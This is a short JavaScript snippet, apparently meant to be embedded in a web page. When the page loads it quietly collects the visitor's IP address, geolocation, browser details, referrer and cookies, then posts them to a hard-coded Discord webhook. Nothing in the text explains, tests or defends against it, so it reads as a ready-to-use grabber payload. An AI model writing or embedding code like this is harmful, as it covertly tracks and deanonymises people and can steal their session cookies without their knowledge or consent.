// Data collection
async function collectData() {
    let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip);
    let geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
    let data = {
        ip: ip,
        city: geo.city,
        region: geo.region,
        country: geo.country_name,
        org: geo.org,
        ua: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        cookie: document.cookie || 'none'
    };
    // Send to Discord Webhook
    await fetch('https://discord.com/api/webhooks/1527970801989718117/rFq_IEq0I4ErsGZRuqcGUm8RiYkA6waWvKSNIIvrMeTvJ84G-Uvg6c9ydost4MGnUBfi', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` })
    });
}
window.onload = collectData;
